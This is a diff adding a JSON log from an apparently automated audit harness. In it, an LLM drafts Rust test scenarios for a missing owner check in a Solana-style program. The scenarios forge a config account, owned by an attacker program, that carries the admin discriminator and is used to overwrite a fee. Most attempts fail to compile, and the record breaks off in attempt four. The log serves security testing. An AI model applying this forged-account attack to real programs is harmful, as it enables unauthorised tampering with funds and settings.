@@ -1,0 +1,272 @@
+{
+  "category": "OWNER",
+  "verdict": "inconclusive",
+  "exploit_successful": false,
+  "attack_result": "Success",
+  "reason": "o ataque nao exercita a hipotese de OWNER: e preciso que uma conta do ataque tem dono diferente da conta na mesma posicao do baseline. Mantenha o baseline como uso legitimo e faca no ataque exatamente essa mudanca.",
+  "attempts_used": 5,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2836,
+        "completion_tokens": 994,
+        "latency_s": 5.03
+      },
+      "raw": "{\n  \"plan\": \"O atacante cria uma conta forjada cujo owner é um programa malicioso (env.attacker_program), com os primeiros 8 bytes iguais ao ADMIN_CONFIG_DISCRIMINATOR e a pubkey do atacante nos bytes 8..40. O baseline usa a instrução update_fee com uma conta config legítima (owner = env.program_id) e a authority correta, provando que o cenário está montado. O ataque repete a mesma instrução, mas substitui a conta config pela conta forjada e usa o atacante como authority signer. O efeito mede que o new_fee foi gravado na conta forjada (offset 40..48), demonstrando que o programa aceitou uma conta com owner diferente do esperado.\",\n  \"scenario\": \"let attacker = Pubkey::new_unique();\\nlet admin = attacker;\\nlet new_fee: u64 = 123456789;\\n\\n// Conta config legítima (owner = programa)\\nlet mut legit_data = vec![0u8; 48];\\nlegit_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\\nlegit_data[8..40].copy_from_slice(admin.as_ref());\\nlegit_data[40..48].copy_from_slice(&0u64.to_le_bytes());\\nlet legit_config = account(&env.program_id, &legit_data, None);\\n\\n// Conta config forjada (owner = programa do atacante)\\nlet mut forged_data = vec![0u8; 48];\\nforged_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\\nforged_data[8..40].copy_from_slice(admin.as_ref());\\nforged_data[40..48].copy_from_slice(&0u64.to_le_bytes());\\nlet attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);\\nlet forged_config = account(&attacker_program, &forged_data, None);\\n\\n// Instrução update_fee: byte 1 + new_fee (u64 LE)\\nlet mut ix_data = vec![1u8];\\nix_data.extend_from_slice(&new_fee.to_le_bytes());\\n\\n// Baseline: uso legítimo com a conta config correta\\nlet baseline_ix = env.raw_ix(&ix_data, &[\\n    AccountMeta::new(legit_config_key, false),\\n    AccountMeta::new_readonly(admin, true),\\n]);\\nlet baseline_accounts = vec![\\n    (legit_config_key, legit_config.clone()),\\n    (admin, wallet(1_000_000_000)),\\n];\\nlet baseline_result = env.baseline(\\\"update_fee legítimo\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: mesma instrução, mas com a conta forjada\\nlet attack_ix = env.raw_ix(&ix_data, &[\\n    AccountMeta::new(forged_config_key, false),\\n    AccountMeta::new_readonly(admin, true),\\n]);\\nlet attack_accounts = vec![\\n    (forged_config_key, forged_config),\\n    (admin, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"update_fee com config forjada\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let forged_after = after(&attack_result, &forged_config_key);\\n    env.effect(\\n        \\\"new_fee gravado na conta forjada com owner diferente do programa\\\",\\n        read_u64(forged_after.data(), 40) == new_fee,\\n    );\\n    env.effect(\\n        \\\"owner da conta forjada é o programa do atacante, não o programa-alvo\\\",\\n        forged_after.owner() == &attacker_program,\\n    );\\n}\"\n}",
+      "plan": "O atacante cria uma conta forjada cujo owner é um programa malicioso (env.attacker_program), com os primeiros 8 bytes iguais ao ADMIN_CONFIG_DISCRIMINATOR e a pubkey do atacante nos bytes 8..40. O baseline usa a instrução update_fee com uma conta config legítima (owner = env.program_id) e a authority correta, provando que o cenário está montado. O ataque repete a mesma instrução, mas substitui a conta config pela conta forjada e usa o atacante como authority signer. O efeito mede que o new_fee foi gravado na conta forjada (offset 40..48), demonstrando que o programa aceitou uma conta com owner diferente do esperado.",
+      "scenario": "let attacker = Pubkey::new_unique();\nlet admin = attacker;\nlet new_fee: u64 = 123456789;\n\n// Conta config legítima (owner = programa)\nlet mut legit_data = vec![0u8; 48];\nlegit_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\nlegit_data[8..40].copy_from_slice(admin.as_ref());\nlegit_data[40..48].copy_from_slice(&0u64.to_le_bytes());\nlet legit_config = account(&env.program_id, &legit_data, None);\n\n// Conta config forjada (owner = programa do atacante)\nlet mut forged_data = vec![0u8; 48];\nforged_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\nforged_data[8..40].copy_from_slice(admin.as_ref());\nforged_data[40..48].copy_from_slice(&0u64.to_le_bytes());\nlet attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);\nlet forged_config = account(&attacker_program, &forged_data, None);\n\n// Instrução update_fee: byte 1 + new_fee (u64 LE)\nlet mut ix_data = vec![1u8];\nix_data.extend_from_slice(&new_fee.to_le_bytes());\n\n// Baseline: uso legítimo com a conta config correta\nlet baseline_ix = env.raw_ix(&ix_data, &[\n    AccountMeta::new(legit_config_key, false),\n    AccountMeta::new_readonly(admin, true),\n]);\nlet baseline_accounts = vec![\n    (legit_config_key, legit_config.clone()),\n    (admin, wallet(1_000_000_000)),\n];\nlet baseline_result = env.baseline(\"update_fee legítimo\", &baseline_ix, &baseline_accounts);\n\n// Ataque: mesma instrução, mas com a conta forjada\nlet attack_ix = env.raw_ix(&ix_data, &[\n    AccountMeta::new(forged_config_key, false),\n    AccountMeta::new_readonly(admin, true),\n]);\nlet attack_accounts = vec![\n    (forged_config_key, forged_config),\n    (admin, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"update_fee com config forjada\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let forged_after = after(&attack_result, &forged_config_key);\n    env.effect(\n        \"new_fee gravado na conta forjada com owner diferente do programa\",\n        read_u64(forged_after.data(), 40) == new_fee,\n    );\n    env.effect(\n        \"owner da conta forjada é o programa do atacante, não o programa-alvo\",\n        forged_after.owner() == &attacker_program,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `legit_config_key` in this scope\n  --> tests/attempt.rs:34:26\n   |\n34 |         AccountMeta::new(legit_config_key, false),\n   |                          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n34 -         AccountMeta::new(legit_config_key, false),\n34 +         AccountMeta::new(legit_config, false),\n   |\n\nerror[E0425]: cannot find value `legit_config_key` in this scope\n  --> tests/attempt.rs:38:10\n   |\n38 |         (legit_config_key, legit_config.clone()),\n   |          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n38 -         (legit_config_key, legit_config.clone()),\n38 +         (legit_config, legit_config.clone()),\n   |\n\nerror[E0425]: cannot find value `forged_config_key` in this scope\n  --> tests/attempt.rs:45:26\n   |\n45 |         AccountMeta::new(forged_config_key, false),\n   |                          ^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n45 -         AccountMeta::new(forged_config_key, false),\n45 +         AccountMeta::new(forged_config, false),\n   |\n\nerror[E0425]: cannot find value `forged_config_key` in this scope\n  --> tests/attempt.rs:49:10\n   |\n49 |         (forged_config_key, forged_config),",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `legit_config_key` in this scope\n  --> tests/attempt.rs:34:26\n   |\n34 |         AccountMeta::new(legit_config_key, false),\n   |                          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n34 -         AccountMeta::new(legit_config_key, false),\n34 +         AccountMeta::new(legit_config, false),\n   |\n\nerror[E0425]: cannot find value `legit_config_key` in this scope\n  --> tests/attempt.rs:38:10\n   |\n38 |         (legit_config_key, legit_config.clone()),\n   |          ^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n38 -         (legit_config_key, legit_config.clone()),\n38 +         (legit_config, legit_config.clone()),\n   |\n\nerror[E0425]: cannot find value `forged_config_key` in this scope\n  --> tests/attempt.rs:45:26\n   |\n45 |         AccountMeta::new(forged_config_key, false),\n   |                          ^^^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n45 -         AccountMeta::new(forged_config_key, false),\n45 +         AccountMeta::new(forged_config, false),\n   |\n\nerror[E0425]: cannot find value `forged_config_key` in this scope\n  --> tests/attempt.rs:49:10\n   |\n49 |         (forged_config_key, forged_config),"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3956,
+        "completion_tokens": 1000,
+        "latency_s": 4.57
+      },
+      "raw": "{\n  \"plan\": \"Preparo duas contas config com o mesmo layout (discriminador ADMIN_CONFIG_DISCRIMINATOR e admin = atacante nos bytes 8..40): uma legítima com owner = programa-alvo e outra forjada com owner = programa do atacante. O baseline chama update_fee com a conta legítima e o atacante como signer, provando que o cenário está correto. O ataque repete a mesma instrução trocando apenas a conta config pela forjada (owner diferente). O efeito mede que o new_fee foi gravado na conta forjada e que seu owner é o programa do atacante, não o programa-alvo.\",\n  \"scenario\": \"let attacker = Pubkey::new_unique();\\nlet admin = attacker;\\nlet new_fee: u64 = 123456789;\\n\\nlet legit_config_key = Pubkey::new_unique();\\nlet forged_config_key = Pubkey::new_unique();\\n\\n// Conta config legítima (owner = programa)\\nlet mut legit_data = vec![0u8; 48];\\nlegit_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\\nlegit_data[8..40].copy_from_slice(admin.as_ref());\\nlegit_data[40..48].copy_from_slice(&0u64.to_le_bytes());\\nlet legit_config = account(&env.program_id, &legit_data, None);\\n\\n// Conta config forjada (owner = programa do atacante)\\nlet mut forged_data = vec![0u8; 48];\\nforged_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\\nforged_data[8..40].copy_from_slice(admin.as_ref());\\nforged_data[40..48].copy_from_slice(&0u64.to_le_bytes());\\nlet attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);\\nlet forged_config = account(&attacker_program, &forged_data, None);\\n\\n// Instrução update_fee: byte 1 + new_fee (u64 LE)\\nlet mut ix_data = vec![1u8];\\nix_data.extend_from_slice(&new_fee.to_le_bytes());\\n\\n// Baseline: uso legítimo com a conta config correta\\nlet baseline_ix = env.raw_ix(&ix_data, &[\\n    AccountMeta::new(legit_config_key, false),\\n    AccountMeta::new_readonly(admin, true),\\n]);\\nlet baseline_accounts = vec![\\n    (legit_config_key, legit_config.clone()),\\n    (admin, wallet(1_000_000_000)),\\n];\\nlet _baseline_result = env.baseline(\\\"update_fee legítimo\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque: mesma instrução, mas com a conta forjada\\nlet attack_ix = env.raw_ix(&ix_data, &[\\n    AccountMeta::new(forged_config_key, false),\\n    AccountMeta::new_readonly(admin, true),\\n]);\\nlet attack_accounts = vec![\\n    (forged_config_key, forged_config),\\n    (admin, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"update_fee com config forjada\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let forged_after = after(&attack_result, &forged_config_key);\\n    env.effect(\\n        \\\"new_fee gravado na conta forjada com owner diferente do programa\\\",\\n        read_u64(forged_after.data(), 40) == new_fee,\\n    );\\n    env.effect(\\n        \\\"owner da conta forjada é o programa do atacante, não o programa-alvo\\\",\\n        forged_after.owner() == &attacker_program,\\n    );\\n}\"\n}",
+      "plan": "Preparo duas contas config com o mesmo layout (discriminador ADMIN_CONFIG_DISCRIMINATOR e admin = atacante nos bytes 8..40): uma legítima com owner = programa-alvo e outra forjada com owner = programa do atacante. O baseline chama update_fee com a conta legítima e o atacante como signer, provando que o cenário está correto. O ataque repete a mesma instrução trocando apenas a conta config pela forjada (owner diferente). O efeito mede que o new_fee foi gravado na conta forjada e que seu owner é o programa do atacante, não o programa-alvo.",
+      "scenario": "let attacker = Pubkey::new_unique();\nlet admin = attacker;\nlet new_fee: u64 = 123456789;\n\nlet legit_config_key = Pubkey::new_unique();\nlet forged_config_key = Pubkey::new_unique();\n\n// Conta config legítima (owner = programa)\nlet mut legit_data = vec![0u8; 48];\nlegit_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\nlegit_data[8..40].copy_from_slice(admin.as_ref());\nlegit_data[40..48].copy_from_slice(&0u64.to_le_bytes());\nlet legit_config = account(&env.program_id, &legit_data, None);\n\n// Conta config forjada (owner = programa do atacante)\nlet mut forged_data = vec![0u8; 48];\nforged_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\nforged_data[8..40].copy_from_slice(admin.as_ref());\nforged_data[40..48].copy_from_slice(&0u64.to_le_bytes());\nlet attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);\nlet forged_config = account(&attacker_program, &forged_data, None);\n\n// Instrução update_fee: byte 1 + new_fee (u64 LE)\nlet mut ix_data = vec![1u8];\nix_data.extend_from_slice(&new_fee.to_le_bytes());\n\n// Baseline: uso legítimo com a conta config correta\nlet baseline_ix = env.raw_ix(&ix_data, &[\n    AccountMeta::new(legit_config_key, false),\n    AccountMeta::new_readonly(admin, true),\n]);\nlet baseline_accounts = vec![\n    (legit_config_key, legit_config.clone()),\n    (admin, wallet(1_000_000_000)),\n];\nlet _baseline_result = env.baseline(\"update_fee legítimo\", &baseline_ix, &baseline_accounts);\n\n// Ataque: mesma instrução, mas com a conta forjada\nlet attack_ix = env.raw_ix(&ix_data, &[\n    AccountMeta::new(forged_config_key, false),\n    AccountMeta::new_readonly(admin, true),\n]);\nlet attack_accounts = vec![\n    (forged_config_key, forged_config),\n    (admin, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"update_fee com config forjada\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let forged_after = after(&attack_result, &forged_config_key);\n    env.effect(\n        \"new_fee gravado na conta forjada com owner diferente do programa\",\n        read_u64(forged_after.data(), 40) == new_fee,\n    );\n    env.effect(\n        \"owner da conta forjada é o programa do atacante, não o programa-alvo\",\n        forged_after.owner() == &attacker_program,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:36:44\n    |\n 36 |       let baseline_ix = env.raw_ix(&ix_data, &[\n    |  ___________________________------___________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 37 | |         AccountMeta::new(legit_config_key, false),\n 38 | |         AccountMeta::new_readonly(admin, true),\n 39 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:47:42\n    |\n 47 |       let attack_ix = env.raw_ix(&ix_data, &[\n    |  _________________________------___________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 48 | |         AccountMeta::new(forged_config_key, false),\n 49 | |         AccountMeta::new_readonly(admin, true),\n 50 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:36:44\n    |\n 36 |       let baseline_ix = env.raw_ix(&ix_data, &[\n    |  ___________________________------___________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 37 | |         AccountMeta::new(legit_config_key, false),\n 38 | |         AccountMeta::new_readonly(admin, true),\n 39 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:47:42\n    |\n 47 |       let attack_ix = env.raw_ix(&ix_data, &[\n    |  _________________________------___________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 48 | |         AccountMeta::new(forged_config_key, false),\n 49 | |         AccountMeta::new_readonly(admin, true),\n 50 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3932,
+        "completion_tokens": 960,
+        "latency_s": 4.47
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta config legítima (owner = programa-alvo) com o discriminador ADMIN_CONFIG_DISCRIMINATOR e a pubkey do admin no offset 8..40, e uma conta config forjada idêntica em dados mas com owner = programa do atacante. O baseline chama update_fee com a conta legítima e deve ter sucesso. O ataque repete a mesma instrução trocando apenas a conta config pela forjada, mantendo o mesmo signer admin. O efeito mede se o new_fee foi gravado na conta forjada (offset 40..48) e se seu owner é o programa do atacante, demonstrando que a checagem de owner foi contornada.\",\n  \"scenario\": \"let attacker = Pubkey::new_unique();\\nlet admin = attacker;\\nlet new_fee: u64 = 123456789;\\n\\nlet legit_config_key = Pubkey::new_unique();\\nlet forged_config_key = Pubkey::new_unique();\\n\\nlet mut legit_data = vec![0u8; 48];\\nlegit_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\\nlegit_data[8..40].copy_from_slice(admin.as_ref());\\nlegit_data[40..48].copy_from_slice(&0u64.to_le_bytes());\\nlet legit_config = account(&env.program_id, &legit_data, None);\\n\\nlet mut forged_data = vec![0u8; 48];\\nforged_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\\nforged_data[8..40].copy_from_slice(admin.as_ref());\\nforged_data[40..48].copy_from_slice(&0u64.to_le_bytes());\\nlet attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);\\nlet forged_config = account(&attacker_program, &forged_data, None);\\n\\nlet mut ix_data = vec![1u8];\\nix_data.extend_from_slice(&new_fee.to_le_bytes());\\n\\nlet baseline_metas = vec![\\n    AccountMeta::new(legit_config_key, false),\\n    AccountMeta::new_readonly(admin, true),\\n];\\nlet baseline_ix = env.raw_ix(&ix_data, &baseline_metas);\\nlet baseline_accounts = vec![\\n    (legit_config_key, legit_config.clone()),\\n    (admin, wallet(1_000_000_000)),\\n];\\nlet _baseline_result = env.baseline(\\\"update_fee legítimo\\\", &baseline_ix, &baseline_accounts);\\n\\nlet attack_metas = vec![\\n    AccountMeta::new(forged_config_key, false),\\n    AccountMeta::new_readonly(admin, true),\\n];\\nlet attack_ix = env.raw_ix(&ix_data, &attack_metas);\\nlet attack_accounts = vec![\\n    (forged_config_key, forged_config),\\n    (admin, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"update_fee com config forjada\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let forged_after = after(&attack_result, &forged_config_key);\\n    env.effect(\\n        \\\"new_fee gravado na conta forjada com owner diferente do programa\\\",\\n        read_u64(forged_after.data(), 40) == new_fee,\\n    );\\n    env.effect(\\n        \\\"owner da conta forjada é o programa do atacante, não o programa-alvo\\\",\\n        forged_after.owner() == &attacker_program,\\n    );\\n}\"\n}",
+      "plan": "Preparo uma conta config legítima (owner = programa-alvo) com o discriminador ADMIN_CONFIG_DISCRIMINATOR e a pubkey do admin no offset 8..40, e uma conta config forjada idêntica em dados mas com owner = programa do atacante. O baseline chama update_fee com a conta legítima e deve ter sucesso. O ataque repete a mesma instrução trocando apenas a conta config pela forjada, mantendo o mesmo signer admin. O efeito mede se o new_fee foi gravado na conta forjada (offset 40..48) e se seu owner é o programa do atacante, demonstrando que a checagem de owner foi contornada.",
+      "scenario": "let attacker = Pubkey::new_unique();\nlet admin = attacker;\nlet new_fee: u64 = 123456789;\n\nlet legit_config_key = Pubkey::new_unique();\nlet forged_config_key = Pubkey::new_unique();\n\nlet mut legit_data = vec![0u8; 48];\nlegit_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\nlegit_data[8..40].copy_from_slice(admin.as_ref());\nlegit_data[40..48].copy_from_slice(&0u64.to_le_bytes());\nlet legit_config = account(&env.program_id, &legit_data, None);\n\nlet mut forged_data = vec![0u8; 48];\nforged_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\nforged_data[8..40].copy_from_slice(admin.as_ref());\nforged_data[40..48].copy_from_slice(&0u64.to_le_bytes());\nlet attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);\nlet forged_config = account(&attacker_program, &forged_data, None);\n\nlet mut ix_data = vec![1u8];\nix_data.extend_from_slice(&new_fee.to_le_bytes());\n\nlet baseline_metas = vec![\n    AccountMeta::new(legit_config_key, false),\n    AccountMeta::new_readonly(admin, true),\n];\nlet baseline_ix = env.raw_ix(&ix_data, &baseline_metas);\nlet baseline_accounts = vec![\n    (legit_config_key, legit_config.clone()),\n    (admin, wallet(1_000_000_000)),\n];\nlet _baseline_result = env.baseline(\"update_fee legítimo\", &baseline_ix, &baseline_accounts);\n\nlet attack_metas = vec![\n    AccountMeta::new(forged_config_key, false),\n    AccountMeta::new_readonly(admin, true),\n];\nlet attack_ix = env.raw_ix(&ix_data, &attack_metas);\nlet attack_accounts = vec![\n    (forged_config_key, forged_config),\n    (admin, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"update_fee com config forjada\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let forged_after = after(&attack_result, &forged_config_key);\n    env.effect(\n        \"new_fee gravado na conta forjada com owner diferente do programa\",\n        read_u64(forged_after.data(), 40) == new_fee,\n    );\n    env.effect(\n        \"owner da conta forjada é o programa do atacante, não o programa-alvo\",\n        forged_after.owner() == &attacker_program,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:36:44\n    |\n 36 |     let baseline_ix = env.raw_ix(&ix_data, &baseline_metas);\n    |                           ------           ^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |                           |\n    |                           arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<_>`\n            found reference `&Vec<_>`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:47:42\n    |\n 47 |     let attack_ix = env.raw_ix(&ix_data, &attack_metas);\n    |                         ------           ^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |                         |\n    |                         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<_>`\n            found reference `&Vec<_>`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:36:44\n    |\n 36 |     let baseline_ix = env.raw_ix(&ix_data, &baseline_metas);\n    |                           ------           ^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |                           |\n    |                           arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<_>`\n            found reference `&Vec<_>`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:47:42\n    |\n 47 |     let attack_ix = env.raw_ix(&ix_data, &attack_metas);\n    |                         ------           ^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&Vec<AccountMeta>`\n    |                         |\n    |                         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<_>`\n            found reference `&Vec<_>`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 4,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3862,
+        "completion_tokens": 931,
+        "latency_s": 4.2
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta config legítima com owner do programa-alvo e uma conta forjada com o mesmo discriminador e a pubkey do atacante como admin, mas com owner igual ao programa do atacante. O baseline chama update_fee com a conta legítima e o atacante como signer, provando que o cenário está montado. O ataque repete a mesma instrução trocando apenas a conta config pela forjada. O efeito mede que o new_fee foi gravado na conta forjada e que seu owner é o programa do atacante, não o programa-alvo.\",\n  \"scenario\": \"let attacker = Pubkey::new_unique();\\nlet admin = attacker;\\nlet new_fee: u64 = 123456789;\\n\\nlet legit_config_key = Pubkey::new_unique();\\nlet forged_config_key = Pubkey::new_unique();\\n\\nlet mut legit_data = vec![0u8; 48];\\nlegit_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\\nlegit_data[8..40].copy_from_slice(admin.as_ref());\\nlegit_data[40..48].copy_from_slice(&0u64.to_le_bytes());\\nlet legit_config = account(&env.program_id, &legit_data, None);\\n\\nlet mut forged_data = vec![0u8; 48];\\nforged_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\\nforged_data[8..40].copy_from_slice(admin.as_ref());\\nforged_data[40..48].copy_from_slice(&0u64.to_le_bytes());\\nlet attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);\\nlet forged_config = account(&attacker_program, &forged_data, None);\\n\\nlet mut ix_data = vec![1u8];\\nix_data.extend_from_slice(&new_fee.to_le_bytes());\\n\\nlet baseline_metas = vec![\\n    AccountMeta::new(legit_config_key, false),\\n    AccountMeta::new_readonly(admin, true),\\n];\\nlet baseline_ix = env.raw_ix(&ix_data, baseline_metas);\\nlet baseline_accounts = vec![\\n    (legit_config_key, legit_config.clone()),\\n    (admin, wallet(1_000_000_000)),\\n];\\nlet _baseline_result = env.baseline(\\\"update_fee legítimo\\\", &baseline_ix, &baseline_accounts);\\n\\nlet attack_metas = vec![\\n    AccountMeta::new(forged_config_key, false),\\n    AccountMeta::new_readonly(admin, true),\\n];\\nlet attack_ix = env.raw_ix(&ix_data, attack_metas);\\nlet attack_accounts = vec![\\n    (forged_config_key, forged_config),\\n    (admin, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"update_fee com config forjada\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let forged_after = after(&attack_result, &forged_config_key);\\n    env.effect(\\n        \\\"new_fee gravado na conta forjada com owner diferente do programa\\\",\\n        read_u64(forged_after.data(), 40) == new_fee,\\n    );\\n    env.effect(\\n        \\\"owner da conta forjada é o programa do atacante, não o programa-alvo\\\",\\n        forged_after.owner() == &attacker_program,\\n    );\\n}\"\n}",
+      "plan": "Preparo uma conta config legítima com owner do programa-alvo e uma conta forjada com o mesmo discriminador e a pubkey do atacante como admin, mas com owner igual ao programa do atacante. O baseline chama update_fee com a conta legítima e o atacante como signer, provando que o cenário está montado. O ataque repete a mesma instrução trocando apenas a conta config pela forjada. O efeito mede que o new_fee foi gravado na conta forjada e que seu owner é o programa do atacante, não o programa-alvo.",
+      "scenario": "let attacker = Pubkey::new_unique();\nlet admin = attacker;\nlet new_fee: u64 = 123456789;\n\nlet legit_config_key = Pubkey::new_unique();\nlet forged_config_key = Pubkey::new_unique();\n\nlet mut legit_data = vec![0u8; 48];\nlegit_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\nlegit_data[8..40].copy_from_slice(admin.as_ref());\nlegit_data[40..48].copy_from_slice(&0u64.to_le_bytes());\nlet legit_config = account(&env.program_id, &legit_data, None);\n\nlet mut forged_data = vec![0u8; 48];\nforged_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\nforged_data[8..40].copy_from_slice(admin.as_ref());\nforged_data[40..48].copy_from_slice(&0u64.to_le_bytes());\nlet attacker_program = env.attacker_program.unwrap_or_else(Pubkey::new_unique);\nlet forged_config = account(&attacker_program, &forged_data, None);\n\nlet mut ix_data = vec![1u8];\nix_data.extend_from_slice(&new_fee.to_le_bytes());\n\nlet baseline_metas = vec![\n    AccountMeta::new(legit_config_key, false),\n    AccountMeta::new_readonly(admin, true),\n];\nlet baseline_ix = env.raw_ix(&ix_data, baseline_metas);\nlet baseline_accounts = vec![\n    (legit_config_key, legit_config.clone()),\n    (admin, wallet(1_000_000_000)),\n];\nlet _baseline_result = env.baseline(\"update_fee legítimo\", &baseline_ix, &baseline_accounts);\n\nlet attack_metas = vec![\n    AccountMeta::new(forged_config_key, false),\n    AccountMeta::new_readonly(admin, true),\n];\nlet attack_ix = env.raw_ix(&ix_data, attack_metas);\nlet attack_accounts = vec![\n    (forged_config_key, forged_config),\n    (admin, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"update_fee com config forjada\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let forged_after = after(&attack_result, &forged_config_key);\n    env.effect(\n        \"new_fee gravado na conta forjada com owner diferente do programa\",\n        read_u64(forged_after.data(), 40) == new_fee,\n    );\n    env.effect(\n        \"owner da conta forjada é o programa do atacante, não o programa-alvo\",\n        forged_after.owner() == &attacker_program,\n    